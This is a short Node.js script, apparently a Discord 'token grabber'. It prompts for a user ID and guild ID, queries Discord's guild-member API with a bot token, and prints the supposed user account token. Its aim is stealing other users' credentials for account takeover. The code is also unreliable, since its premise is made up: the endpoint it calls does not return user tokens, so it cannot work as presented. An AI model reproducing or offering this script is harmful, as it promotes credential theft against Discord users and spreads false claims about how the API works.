const axios = require("axios");
const prompt = require('prompt-sync')();

async function getTokens(user_id, guild_id) {
    const headers = {
        "Authorization": "Bot " + "YOUR_BOT_TOKEN"
    };
    const url = `https://discord.com/api/v10/guilds/${guild_id}/members/${user_id}`;
    try {
        const response = await axios.get(url, { headers });
        if (response.status === 200) {
            return response.data.user.token;
        } else {
            return null;
        }
    } catch (error) {
        return null;
    }
}

async function main() {
    const user_id = prompt("Enter the user ID: ");
    const guild_id = prompt("Enter the guild ID: ");
    try {
        const token = await getTokens(user_id, guild_id);
        if (token) {
            console.log(`[+] Discord Token: ${token}`);
        } else {
            console.log("[-] Failed to get the token.");
        }
    } catch (error) {
        console.log("[-] An error occurred:", error);
    }
}

main();
